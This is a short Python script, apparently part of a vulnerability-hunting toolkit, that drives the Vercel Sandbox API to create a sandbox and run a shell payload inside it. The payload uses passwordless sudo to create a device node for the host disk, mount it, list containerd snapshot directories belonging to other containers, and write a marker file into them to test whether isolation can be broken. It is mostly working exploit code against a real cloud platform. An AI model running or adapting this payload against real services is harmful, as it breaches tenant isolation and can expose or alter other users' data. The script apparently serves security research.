# -*- coding: utf-8 -*-
import sys, json, time, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

NAME = 'v53p'
api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
time.sleep(2)
c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": NAME}, timeout=120)
print('create:', c, r[:150])
sid = json.loads(r)['sandbox']['currentSessionId']
time.sleep(5)


def cmdsh(s, t=30000):
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "sh", "args": ["-c", s], "wait": True, "logs": True, "timeout": t}, timeout=t // 1000 + 30)
    return c, r


S = ('id; sudo -n true 2>&1 && echo SUDO_OK; '
     'sudo -n mknod /dev/vda b 254 0 2>/dev/null; sudo -n mkdir -p /mnt/vdax; '
     'sudo -n mount /dev/vda /mnt/vdax 2>&1; '
     'echo ===LS1===; sudo -n ls /mnt/vdax/ 2>&1 | head -30; '
     'echo ===SNAP===; sudo -n ls /mnt/vdax/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/ 2>&1 | head -20; '
     'echo ===VERCEL===; sudo -n ls -la /mnt/vdax/vercel/ 2>&1 | head; '
     'echo ===UPPER===; for d in /mnt/vdax/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/*/fs; do '
     'if [ -d "$d/vercel" ] || [ -d "$d/vercel/sandbox" ]; then echo FOUND $d; ls "$d/vercel" 2>&1 | head; fi; done; '
     'echo ===WRITE===; for d in /mnt/vdax/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/*/fs; do '
     'if [ -d "$d/vercel/sandbox" ]; then sudo -n touch "$d/vercel/sandbox/_upper_t" 2>&1 && echo WROTE $d; fi; done; '
     'echo ===COWCHECK===; ls -la /vercel/sandbox/_upper_t 2>&1')
c, r = cmdsh(S, 60000)
print('rc:', c)
print((r or '')[:6000])
api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
